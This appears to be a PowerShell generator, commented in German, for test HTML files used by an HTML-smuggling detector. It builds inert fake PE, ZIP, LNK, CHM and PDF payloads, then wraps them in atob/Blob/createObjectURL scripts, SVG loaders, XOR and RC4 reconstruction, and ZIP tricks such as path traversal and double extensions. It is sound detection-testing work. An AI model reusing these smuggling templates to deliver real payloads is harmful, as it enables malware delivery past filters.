# create_html_pattern_test_suite_v4_6_0_r1.ps1
# Erweiterte HTML Pattern Test Suite fuer HTML Smuggling Detection v4.6.0-r1
#
# Wichtig:
#   Diese Suite testet bewusst nur HTML und Script Muster.
#   Alles, was echte MIME Parts, echte Attachment Dateinamen, echte Header oder
#   echte Newsletter Mailheader braucht, gehoert in eine separate EML Suite.
#
# Ziel:
#   - Decode Gates sicher erfuellen
#   - schwache oder falsch gemappte Alt-Tests bereinigen
#   - fehlende positive HTML Pattern Tests ergaenzen
#   - realistische Manifest Daten mit ExpectedCoreReasons und ExpectedInfoReasons erzeugen
#   - v4.6.0 Script-Prescan, ZIP-Metadaten und konstante Crypto-Rekonstruktion testen
#
# Decode Gates aus der Lua Logik:
#   LB64.min_len = 200
#   LB64.min_decode_total = 400

param(
  [switch]$Force
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

Write-Host "╔══════════════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║   HTML Pattern Test Suite v4.6.0-r1                                                 ║" -ForegroundColor Cyan
Write-Host "║   Fokus: HTML, Decode, Prescan, ZIP, XOR/RC4, SVG, CSS, Evasion, Web3     ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

$testFolderName = 'HTML_Smuggling_HTMLPatternSuite_v4_6_0_r1'
$outputRoot = Join-Path -Path (Get-Location).Path -ChildPath $testFolderName
$utf8NoBom = [System.Text.UTF8Encoding]::new($false)

$MinDecodeBase64Chars = 400
$TargetPayloadBytes = 320

if (-not (Test-Path -LiteralPath $outputRoot)) {
  New-Item -ItemType Directory -Path $outputRoot | Out-Null
}

function Join-ByteArrays {
  param(
    [Parameter(Mandatory)]
    [byte[][]]$Arrays
  )

  $ms = New-Object System.IO.MemoryStream
  try {
    foreach ($arr in $Arrays) {
      if ($null -ne $arr -and $arr.Length -gt 0) {
        $ms.Write($arr, 0, $arr.Length)
      }
    }
    return $ms.ToArray()
  }
  finally {
    $ms.Dispose()
  }
}

function Ensure-MinimumByteLength {
  param(
    [Parameter(Mandatory)]
    [byte[]]$Bytes,

    [int]$MinimumBytes = 320,

    [byte]$PadByte = 0x41
  )

  if ($Bytes.Length -ge $MinimumBytes) {
    return $Bytes
  }

  $pad = New-Object byte[] ($MinimumBytes - $Bytes.Length)
  for ($i = 0; $i -lt $pad.Length; $i++) {
    $pad[$i] = $PadByte
  }

  return (Join-ByteArrays -Arrays @($Bytes, $pad))
}

function Convert-BytesToBase64 {
  param(
    [Parameter(Mandatory)]
    [byte[]]$Bytes,

    [int]$MinimumBytes = 320,

    [byte]$PadByte = 0x41
  )

  $normalized = Ensure-MinimumByteLength -Bytes $Bytes -MinimumBytes $MinimumBytes -PadByte $PadByte
  return [Convert]::ToBase64String($normalized)
}

function Convert-TextToBase64MinSize {
  param(
    [Parameter(Mandatory)]
    [string]$Text,

    [int]$MinimumBytes = 320,

    [string]$PadChunk = "`r`n/* PAD_FOR_HTML_SMUGGLING_TEST_SUITE_0123456789ABCDEF */"
  )

  $buffer = $Text
  while ([System.Text.Encoding]::UTF8.GetByteCount($buffer) -lt $MinimumBytes) {
    $buffer += $PadChunk
  }

  $bytes = [System.Text.Encoding]::UTF8.GetBytes($buffer)
  return [Convert]::ToBase64String($bytes)
}

function Assert-MinBase64Length {
  param(
    [Parameter(Mandatory)]
    [string]$Name,

    [Parameter(Mandatory)]
    [string]$Base64,

    [int]$MinimumChars = 400
  )

  if ($Base64.Length -lt $MinimumChars) {
    throw "$Name ist zu kurz fuer den Decode Gate. Laenge=$($Base64.Length), Minimum=$MinimumChars"
  }
}

function Write-Utf8NoBomFile {
  param(
    [Parameter(Mandatory)][string]$Path,
    [Parameter(Mandatory)][string]$Content
  )

  [System.IO.File]::WriteAllText($Path, $Content, $utf8NoBom)
}

function New-FakePEHeader {
  [byte[]]$dos = @(
    0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00,
    0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x00
  )

  $stubLen = 0x80 - $dos.Length
  $stub = New-Object byte[] $stubLen
  for ($i = 0; $i -lt $stub.Length; $i++) {
    $stub[$i] = 0x0E
  }

  [byte[]]$pe = @(
    0x50,0x45,0x00,0x00,
    0x4C,0x01,
    0x03,0x00,
    0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,
    0xE0,0x00,
    0x02,0x01
  )

  $optional = New-Object byte[] 224
  $optional[0] = 0x0B
  $optional[1] = 0x01

  [byte[]]$full = Join-ByteArrays -Arrays @($dos, $stub, $pe, $optional)

  if ($full.Length -lt 512) {
    $padding = New-Object byte[] (512 - $full.Length)
    $full = Join-ByteArrays -Arrays @($full, $padding)
  }

  return (Convert-BytesToBase64 -Bytes $full -MinimumBytes $TargetPayloadBytes)
}

function New-FakeWASMModule {
  [byte[]]$wasm = Join-ByteArrays -Arrays @(
    [byte[]](0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00),
    [byte[]](0x01,0x04,0x01,0x60,0x00,0x00),
    [byte[]](0x03,0x02,0x01,0x00),
    [byte[]](0x07,0x08,0x01,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00),
    [byte[]](0x0A,0x04,0x01,0x02,0x00,0x0B)
  )

  return (Convert-BytesToBase64 -Bytes $wasm -MinimumBytes $TargetPayloadBytes)
}

function New-FakeZipContainer {
  [byte[]]$zip = @(
    0x50,0x4B,0x03,0x04,0x14,0x00,0x00,0x00,0x08,0x00,
    0x00,0x00,0x21,0x00,0x12,0x34,0x56,0x78,0x08,0x00,
    0x00,0x00,0x08,0x00,0x00,0x00,0x08,0x00,0x00,0x00,
    0x74,0x65,0x73,0x74,0x2E,0x74,0x78,0x74,0x54,0x45,
    0x53,0x54,0x44,0x41,0x54,0x41
  )
  return (Convert-BytesToBase64 -Bytes $zip -MinimumBytes $TargetPayloadBytes)
}

function New-FakeCHM {
  [byte[]]$chm = @(
    0x49,0x54,0x53,0x46,0x03,0x00,0x00,0x00,0x60,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0xAA,0xBB,0xCC,0xDD
  )
  return (Convert-BytesToBase64 -Bytes $chm -MinimumBytes $TargetPayloadBytes)
}

function New-FakeLNK {
  [byte[]]$lnk = @(
    0x4C,0x00,0x00,0x00,
    0x01,0x14,0x02,0x00,
    0x00,0x00,0x00,0x00,
    0xC0,0x00,0x00,0x00,
    0x00,0x00,0x00,0x46
  )
  return (Convert-BytesToBase64 -Bytes $lnk -MinimumBytes $TargetPayloadBytes)
}

function New-FakePDFWithJavaScript {
  $pdf = @"
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
endobj
4 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert('Malicious PDF');) >>
endobj
5 0 obj
<< /Length 44 >>
stream
BT /F1 12 Tf 100 700 Td (Hello) Tj ET
endstream
endobj
xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000077 00000 n
0000000136 00000 n
0000000212 00000 n
0000000287 00000 n
trailer
<< /Size 6 /Root 1 0 R >>
startxref
354
%%EOF
"@
  return (Convert-TextToBase64MinSize -Text $pdf -MinimumBytes $TargetPayloadBytes)
}

function New-FakePDFWithLaunch {
  $pdf = @"
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles 4 0 R >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
4 0 obj
<< /Names [ (file) 5 0 R ] >>
endobj
5 0 obj
<< /Type /Filespec /F (malware.exe) /EF << /F 6 0 R >> /UF (malware.exe) >>
endobj
6 0 obj
<< /Type /EmbeddedFile /Length 16 /Params << /Size 16 >> >>
stream
MZFAKEPAYLOAD01
endstream
endobj
7 0 obj
<< /Type /Action /S /Launch /Win << /F (malware.exe) >> >>
endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000094 00000 n
0000000153 00000 n
0000000214 00000 n
0000000264 00000 n
0000000355 00000 n
0000000460 00000 n
trailer
<< /Size 8 /Root 1 0 R >>
startxref
525
%%EOF
"@
  return (Convert-TextToBase64MinSize -Text $pdf -MinimumBytes $TargetPayloadBytes)
}

function New-FakeCertificate {
  return @"
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAKlQz7jYpU9MMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVB
AYTAkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcMBk11ZW5jaDERMA8GA1UE
CgwIVGVzdCBDQTAeFw0yNDAxMDEwMDAwMDBaFw0yNTAxMDEwMDAwMDBaMEUxCzAJ
BgNVBAYTAkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcMBk11ZW5jaDERMA8G
A1UECgwIVGVzdCBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMtC
j3lZxJzLxVvzQtq0Wq7X8j2N5P9MkQoRf2A3B4cD5E6F7G8H9I0J1K2L3M4N5O6P
-----END CERTIFICATE-----
"@
}

function New-FakePKCS7 {
  return @"
-----BEGIN PKCS7-----
MIIB1gYJKoZIhvcNAQcCoIIBxzCCAcMCAQExADALBgkqhkiG9w0BBwGgggGmMIIB
ojCCAYugAwIBAgIJAJlQz7jYpU9MMA0GCSqGSIb3DQEBCwUAMFExCzAJBgNVBAYT
AkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcMBk11ZW5jaDERMA8GA1UECgwI
VGVzdCBDQTENMAsGA1UEAwwEdGVzdDAeFw0yNDAxMDEwMDAwMDBaFw0yNTAxMDEw
MDAwMDBaMFExCzAJBgNVBAYTAkRFMQ8wDQYDVQQIDAZCYXllcm4xDzANBgNVBAcM
Bk11ZW5jaDERMA8GA1UECgwIVGVzdCBDQTENMAsGA1UEAwwEdGVzdDCBnzANBgkq
hkiG9w0BAQEFAAOBjQAwgYkCgYEAy0KPeVnEnMvFWNC2rRartfyPY3k0yRChFYYDc
HhwPkToXsHwj0jQnUrYszg0nU6P7Q8R9S0T1U2V3W4X5Y6Z7a8b9c0d1e2f3g4h5i6
j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3A4B5C6D7E8F9G0H1I2J3K4L5M6N
-----END PKCS7-----
"@
}

function New-FakeSVG {
  param(
    [Parameter(Mandatory)][string]$EmbeddedBase64
  )

  return @"
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xhtml="http://www.w3.org/1999/xhtml" width="100" height="100" onload="console.log('svg-loaded')">
  <script type="text/javascript"><![CDATA[
    var payload = "$EmbeddedBase64";
    var decoded = atob(payload);
    var blob = new Blob([decoded], {type: 'application/octet-stream'});
    var url = URL.createObjectURL(blob);
    window.__smuggle_url = url;
  ]]></script>
  <rect x="10" y="10" width="80" height="80" fill="red"/>
  <foreignObject x="0" y="0" width="50" height="20">
    <xhtml:div>svg smuggling</xhtml:div>
  </foreignObject>
  <image href="data:application/octet-stream;base64,$EmbeddedBase64" width="1" height="1" />
</svg>
"@
}

function New-LargeUint8ArrayLiteral {
  param(
    [int]$Count = 1100
  )

  $bytes = New-Object System.Collections.Generic.List[string]
  $seed = [byte[]](
    0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,
    0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00,
    0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x50,0x45,0x00,0x00
  )

  foreach ($b in $seed) {
    [void]$bytes.Add([string]$b)
  }

  $fillCount = $Count - $seed.Length
  for ($i = 0; $i -lt $fillCount; $i++) {
    [void]$bytes.Add([string](($i % 251) + 1))
  }

  return ($bytes -join ',')
}

function Add-TestFile {
  param(
    [Parameter(Mandatory)][ref]$List,
    [Parameter(Mandatory)][string]$Name,
    [Parameter(Mandatory)][string]$ExpectedScore,
    [Parameter(Mandatory)][string]$ExpectedDetection,
    [Parameter(Mandatory)][string]$ExpectedCoreReasons,
    [string]$ExpectedInfoReasons = 'none',
    [Parameter(Mandatory)][string]$Description,
    [Parameter(Mandatory)][string]$Category,
    [Parameter(Mandatory)][string]$Content
  )

  $List.Value += @{
    Name = $Name
    ExpectedScore = $ExpectedScore
    ExpectedDetection = $ExpectedDetection
    ExpectedCoreReasons = $ExpectedCoreReasons
    ExpectedInfoReasons = $ExpectedInfoReasons
    Description = $Description
    Category = $Category
    Content = $Content
  }
}

# -----------------------------------------------------------------------------
# v4.6.0 Helpers: ZIP Parser, Script Prescan und konstante Crypto Rekonstruktion
# -----------------------------------------------------------------------------

function Convert-BytesToJsArray {
  param(
    [Parameter(Mandatory)][byte[]]$Bytes,
    [switch]$Hex
  )

  if ($Hex) {
    return (($Bytes | ForEach-Object { '0x{0:X2}' -f $_ }) -join ',')
  }
  return (($Bytes | ForEach-Object { [string]$_ }) -join ',')
}

function Protect-XorBytes {
  param(
    [Parameter(Mandatory)][byte[]]$Bytes,
    [Parameter(Mandatory)][byte]$Key
  )

  $out = New-Object byte[] $Bytes.Length
  for ($i = 0; $i -lt $Bytes.Length; $i++) {
    $out[$i] = [byte]($Bytes[$i] -bxor $Key)
  }
  return $out
}

function Invoke-Rc4Bytes {
  param(
    [Parameter(Mandatory)][byte[]]$Bytes,
    [Parameter(Mandatory)][string]$Key
  )

  $keyBytes = [System.Text.Encoding]::ASCII.GetBytes($Key)
  if ($keyBytes.Length -eq 0) { throw 'RC4 Key darf nicht leer sein' }

  $sbox = New-Object int[] 256
  for ($i = 0; $i -lt 256; $i++) { $sbox[$i] = $i }

  $j = 0
  for ($i = 0; $i -lt 256; $i++) {
    $j = ($j + $sbox[$i] + $keyBytes[$i % $keyBytes.Length]) % 256
    $tmp = $sbox[$i]; $sbox[$i] = $sbox[$j]; $sbox[$j] = $tmp
  }

  $out = New-Object byte[] $Bytes.Length
  $i = 0
  $j = 0
  for ($n = 0; $n -lt $Bytes.Length; $n++) {
    $i = ($i + 1) % 256
    $j = ($j + $sbox[$i]) % 256
    $tmp = $sbox[$i]; $sbox[$i] = $sbox[$j]; $sbox[$j] = $tmp
    $k = $sbox[($sbox[$i] + $sbox[$j]) % 256]
    $out[$n] = [byte]($Bytes[$n] -bxor $k)
  }
  return $out
}

function Write-Le16 {
  param([Parameter(Mandatory)][System.IO.Stream]$Stream, [Parameter(Mandatory)][UInt16]$Value)
  $b = [BitConverter]::GetBytes($Value)
  if (-not [BitConverter]::IsLittleEndian) { [Array]::Reverse($b) }
  $Stream.Write($b, 0, $b.Length)
}

function Write-Le32 {
  param([Parameter(Mandatory)][System.IO.Stream]$Stream, [Parameter(Mandatory)][UInt32]$Value)
  $b = [BitConverter]::GetBytes($Value)
  if (-not [BitConverter]::IsLittleEndian) { [Array]::Reverse($b) }
  $Stream.Write($b, 0, $b.Length)
}

function Write-ZipBytes {
  param([Parameter(Mandatory)][System.IO.Stream]$Stream, [Parameter(Mandatory)][byte[]]$Bytes)
  if ($Bytes.Length -gt 0) { $Stream.Write($Bytes, 0, $Bytes.Length) }
}

function New-ZipEntrySpec {
  param(
    [Parameter(Mandatory)][string]$Name,
    [byte[]]$Data = ([byte[]]@()),
    [UInt16]$Flags = 0,
    [UInt16]$Method = 0,
    [Nullable[UInt32]]$ReportedCompressed = $null,
    [Nullable[UInt32]]$ReportedUncompressed = $null
  )

  [PSCustomObject]@{
    Name = $Name
    Data = $Data
    Flags = $Flags
    Method = $Method
    ReportedCompressed = $ReportedCompressed
    ReportedUncompressed = $ReportedUncompressed
  }
}

function New-TestZipBytes {
  param([Parameter(Mandatory)][object[]]$Entries)

  $ms = New-Object System.IO.MemoryStream
  $central = New-Object System.Collections.Generic.List[object]

  try {
    foreach ($entry in $Entries) {
      [byte[]]$nameBytes = [System.Text.Encoding]::UTF8.GetBytes([string]$entry.Name)
      [byte[]]$data = if ($null -eq $entry.Data) { [byte[]]@() } else { [byte[]]$entry.Data }
      [UInt32]$comp = if ($null -ne $entry.ReportedCompressed) { [UInt32]$entry.ReportedCompressed } else { [UInt32]$data.Length }
      [UInt32]$uncomp = if ($null -ne $entry.ReportedUncompressed) { [UInt32]$entry.ReportedUncompressed } else { [UInt32]$data.Length }
      [UInt32]$localOffset = [UInt32]$ms.Position

      Write-Le32 -Stream $ms -Value 0x04034B50
      Write-Le16 -Stream $ms -Value 20
      Write-Le16 -Stream $ms -Value ([UInt16]$entry.Flags)
      Write-Le16 -Stream $ms -Value ([UInt16]$entry.Method)
      Write-Le16 -Stream $ms -Value 0
      Write-Le16 -Stream $ms -Value 0
      Write-Le32 -Stream $ms -Value 0
      Write-Le32 -Stream $ms -Value $comp
      Write-Le32 -Stream $ms -Value $uncomp
      Write-Le16 -Stream $ms -Value ([UInt16]$nameBytes.Length)
      Write-Le16 -Stream $ms -Value 0
      Write-ZipBytes -Stream $ms -Bytes $nameBytes
      Write-ZipBytes -Stream $ms -Bytes $data

      $central.Add([PSCustomObject]@{
        NameBytes = $nameBytes
        Flags = [UInt16]$entry.Flags
        Method = [UInt16]$entry.Method
        Compressed = $comp
        Uncompressed = $uncomp
        Offset = $localOffset
      }) | Out-Null
    }

    [UInt32]$centralOffset = [UInt32]$ms.Position
    foreach ($entry in $central) {
      Write-Le32 -Stream $ms -Value 0x02014B50
      Write-Le16 -Stream $ms -Value 20
      Write-Le16 -Stream $ms -Value 20
      Write-Le16 -Stream $ms -Value $entry.Flags
      Write-Le16 -Stream $ms -Value $entry.Method
      Write-Le16 -Stream $ms -Value 0
      Write-Le16 -Stream $ms -Value 0
      Write-Le32 -Stream $ms -Value 0
      Write-Le32 -Stream $ms -Value $entry.Compressed
      Write-Le32 -Stream $ms -Value $entry.Uncompressed
      Write-Le16 -Stream $ms -Value ([UInt16]$entry.NameBytes.Length)
      Write-Le16 -Stream $ms -Value 0
      Write-Le16 -Stream $ms -Value 0
      Write-Le16 -Stream $ms -Value 0
      Write-Le16 -Stream $ms -Value 0
      Write-Le32 -Stream $ms -Value 0
      Write-Le32 -Stream $ms -Value $entry.Offset
      Write-ZipBytes -Stream $ms -Bytes $entry.NameBytes
    }

    [UInt32]$centralSize = [UInt32]($ms.Position - $centralOffset)
    [UInt16]$count = [UInt16][Math]::Min($central.Count, 65535)

    Write-Le32 -Stream $ms -Value 0x06054B50
    Write-Le16 -Stream $ms -Value 0
    Write-Le16 -Stream $ms -Value 0
    Write-Le16 -Stream $ms -Value $count
    Write-Le16 -Stream $ms -Value $count
    Write-Le32 -Stream $ms -Value $centralSize
    Write-Le32 -Stream $ms -Value $centralOffset
    Write-Le16 -Stream $ms -Value 0

    return $ms.ToArray()
  }
  finally {
    $ms.Dispose()
  }
}

function Convert-TestZipToBase64 {
  param([Parameter(Mandatory)][object[]]$Entries)
  return [Convert]::ToBase64String((New-TestZipBytes -Entries $Entries))
}

function New-PseudoGzipPayload {
  $bytes = New-Object byte[] 420
  $bytes[0] = 0x1F; $bytes[1] = 0x8B; $bytes[2] = 0x08; $bytes[3] = 0x00
  for ($i = 4; $i -lt $bytes.Length; $i++) { $bytes[$i] = [byte](($i * 73 + 19) % 251) }
  return [Convert]::ToBase64String($bytes)
}

Write-Host "Generiere Payloads..." -ForegroundColor Yellow
$PE_BASE64 = New-FakePEHeader
$WASM_BASE64 = New-FakeWASMModule
$PDF_JS_BASE64 = New-FakePDFWithJavaScript
$PDF_LAUNCH_BASE64 = New-FakePDFWithLaunch
$ZIP_BASE64 = New-FakeZipContainer
$CHM_BASE64 = New-FakeCHM
$LNK_BASE64 = New-FakeLNK
$CERT_PEM = New-FakeCertificate
$CERT_PKCS7 = New-FakePKCS7
$SVG_CONTENT = New-FakeSVG -EmbeddedBase64 $PE_BASE64
$SVG_BASE64 = Convert-TextToBase64MinSize -Text $SVG_CONTENT -MinimumBytes $TargetPayloadBytes
$HTA_BASE64 = Convert-TextToBase64MinSize -Text '<HTA:APPLICATION><script>alert("xs")</script>' -MinimumBytes $TargetPayloadBytes
$UINT8ARRAY_LITERAL = New-LargeUint8ArrayLiteral -Count 1100
$certPemB64 = Convert-TextToBase64MinSize -Text $CERT_PEM -MinimumBytes $TargetPayloadBytes
$certPkcs7B64 = Convert-TextToBase64MinSize -Text $CERT_PKCS7 -MinimumBytes $TargetPayloadBytes


# v4.6.0 Test-Payloads
$PE_BYTES = [Convert]::FromBase64String($PE_BASE64)
$PE_HEX_ARRAY = Convert-BytesToJsArray -Bytes $PE_BYTES -Hex
$NESTED_PE_BASE64 = Convert-TextToBase64MinSize -Text $PE_BASE64 -MinimumBytes $TargetPayloadBytes
$GZIP_BASE64 = New-PseudoGzipPayload

$zipPad = New-Object byte[] 320
for ($i = 0; $i -lt $zipPad.Length; $i++) { $zipPad[$i] = [byte](65 + ($i % 23)) }

$ZIP_EXE_BASE64 = Convert-TestZipToBase64 -Entries @(
  (New-ZipEntrySpec -Name 'payload.exe' -Data $zipPad)
)
$ZIP_SCRIPT_BASE64 = Convert-TestZipToBase64 -Entries @(
  (New-ZipEntrySpec -Name 'stage.ps1' -Data $zipPad)
)
$ZIP_DOUBLE_BASE64 = Convert-TestZipToBase64 -Entries @(
  (New-ZipEntrySpec -Name 'invoice.pdf.exe' -Data $zipPad)
)
$ZIP_TRAVERSAL_BASE64 = Convert-TestZipToBase64 -Entries @(
  (New-ZipEntrySpec -Name '../dropper.ps1' -Data $zipPad)
)
$ZIP_NESTED_BASE64 = Convert-TestZipToBase64 -Entries @(
  (New-ZipEntrySpec -Name 'inner.zip' -Data $zipPad)
)
$ZIP_ENCRYPTED_BASE64 = Convert-TestZipToBase64 -Entries @(
  (New-ZipEntrySpec -Name 'locked.bin' -Data $zipPad -Flags 1)
)
$ZIP_HIGH_RATIO_BASE64 = Convert-TestZipToBase64 -Entries @(
  (New-ZipEntrySpec -Name 'huge.bin' -Data ([byte[]](1..16)) -Method 8 -ReportedCompressed ([UInt32]16) -ReportedUncompressed ([UInt32](2 * 1024 * 1024)))
)
$ZIP_STORED_PE_BASE64 = Convert-TestZipToBase64 -Entries @(
  (New-ZipEntrySpec -Name 'payload.bin' -Data $PE_BYTES -Method 0)
)

$manyEntries = New-Object System.Collections.Generic.List[object]
for ($i = 0; $i -lt 257; $i++) {
  $manyEntries.Add((New-ZipEntrySpec -Name ("item_{0:D3}.txt" -f $i) -Data ([byte[]](65,66,67,68)))) | Out-Null
}
$ZIP_MANY_BASE64 = Convert-TestZipToBase64 -Entries $manyEntries.ToArray()

$XOR_KEY = [byte]0x23
$XOR_PE_BYTES = Protect-XorBytes -Bytes $PE_BYTES -Key $XOR_KEY
$XOR_PE_ARRAY = Convert-BytesToJsArray -Bytes $XOR_PE_BYTES

$RC4_KEY = 'testkey'
$RC4_PE_BYTES = Invoke-Rc4Bytes -Bytes $PE_BYTES -Key $RC4_KEY
$RC4_PE_ARRAY = Convert-BytesToJsArray -Bytes $RC4_PE_BYTES

$prescanLateBuilder = New-Object System.Text.StringBuilder
[void]$prescanLateBuilder.AppendLine('<!DOCTYPE html><html><body>')
for ($i = 1; $i -le 7; $i++) {
  [void]$prescanLateBuilder.AppendLine("<script>var filler$i = 'normal-script-$i-abcdefghijklmnopqrstuvwxyz'; console.log(filler$i);</script>")
}
[void]$prescanLateBuilder.AppendLine("<script>var latePayload='$PE_BASE64'; var d=atob(latePayload); var b=new Blob([d]); var u=URL.createObjectURL(b); window.__late=u;</script>")
[void]$prescanLateBuilder.AppendLine('</body></html>')
$PRESCAN_LATE_HTML = $prescanLateBuilder.ToString()

$prescanBudgetBuilder = New-Object System.Text.StringBuilder
[void]$prescanBudgetBuilder.AppendLine('<!DOCTYPE html><html><body>')
[void]$prescanBudgetBuilder.AppendLine("<script>var p='$PE_BASE64'; var d=atob(p); var b=new Blob([d]); URL.createObjectURL(b);</script>")
for ($i = 1; $i -le 70; $i++) {
  [void]$prescanBudgetBuilder.AppendLine("<script>var benign$i = 'prescan-budget-filler-$i-abcdefghijklmnopqrstuvwxyz-0123456789'; console.log(benign$i);</script>")
}
[void]$prescanBudgetBuilder.AppendLine('</body></html>')
$PRESCAN_BUDGET_HTML = $prescanBudgetBuilder.ToString()

Assert-MinBase64Length -Name 'PE_BASE64' -Base64 $PE_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'WASM_BASE64' -Base64 $WASM_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'PDF_JS_BASE64' -Base64 $PDF_JS_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'PDF_LAUNCH_BASE64' -Base64 $PDF_LAUNCH_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'ZIP_BASE64' -Base64 $ZIP_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'CHM_BASE64' -Base64 $CHM_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'LNK_BASE64' -Base64 $LNK_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'SVG_BASE64' -Base64 $SVG_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'HTA_BASE64' -Base64 $HTA_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'certPemB64' -Base64 $certPemB64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'certPkcs7B64' -Base64 $certPkcs7B64 -MinimumChars $MinDecodeBase64Chars

Assert-MinBase64Length -Name 'NESTED_PE_BASE64' -Base64 $NESTED_PE_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'GZIP_BASE64' -Base64 $GZIP_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'ZIP_EXE_BASE64' -Base64 $ZIP_EXE_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'ZIP_SCRIPT_BASE64' -Base64 $ZIP_SCRIPT_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'ZIP_DOUBLE_BASE64' -Base64 $ZIP_DOUBLE_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'ZIP_TRAVERSAL_BASE64' -Base64 $ZIP_TRAVERSAL_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'ZIP_NESTED_BASE64' -Base64 $ZIP_NESTED_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'ZIP_ENCRYPTED_BASE64' -Base64 $ZIP_ENCRYPTED_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'ZIP_STORED_PE_BASE64' -Base64 $ZIP_STORED_PE_BASE64 -MinimumChars $MinDecodeBase64Chars
Assert-MinBase64Length -Name 'ZIP_MANY_BASE64' -Base64 $ZIP_MANY_BASE64 -MinimumChars $MinDecodeBase64Chars

Write-Host "v4.6 ZIP EXE Payload: $($ZIP_EXE_BASE64.Length) Zeichen" -ForegroundColor DarkGray
Write-Host "v4.6 ZIP Stored PE:  $($ZIP_STORED_PE_BASE64.Length) Zeichen" -ForegroundColor DarkGray
Write-Host "v4.6 ZIP Many:       $($ZIP_MANY_BASE64.Length) Zeichen" -ForegroundColor DarkGray
Write-Host "v4.6 XOR Array Bytes: $($XOR_PE_BYTES.Length)" -ForegroundColor DarkGray
Write-Host "v4.6 RC4 Array Bytes: $($RC4_PE_BYTES.Length)" -ForegroundColor DarkGray
Write-Host "PE Payload: $($PE_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "WASM Payload: $($WASM_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "PDF JS Payload: $($PDF_JS_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "PDF Launch Payload: $($PDF_LAUNCH_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "ZIP Payload: $($ZIP_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "CHM Payload: $($CHM_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "LNK Payload: $($LNK_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "SVG Payload: $($SVG_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "HTA Payload: $($HTA_BASE64.Length) Zeichen" -ForegroundColor Gray
Write-Host "CERT PEM Payload: $($certPemB64.Length) Zeichen" -ForegroundColor Gray
Write-Host "CERT PKCS7 Payload: $($certPkcs7B64.Length) Zeichen" -ForegroundColor Gray
Write-Host ""

$testFiles = @()

# 01
Add-TestFile -List ([ref]$testFiles) -Name 'test01_basic_pe_smuggling.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'atob,blob,createObjectURL,dec_pe' -Description 'Basis: atob plus Blob plus createObjectURL plus PE' -Category 'JS_SMUGGLING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var payload = "$PE_BASE64";
var decoded = atob(payload);
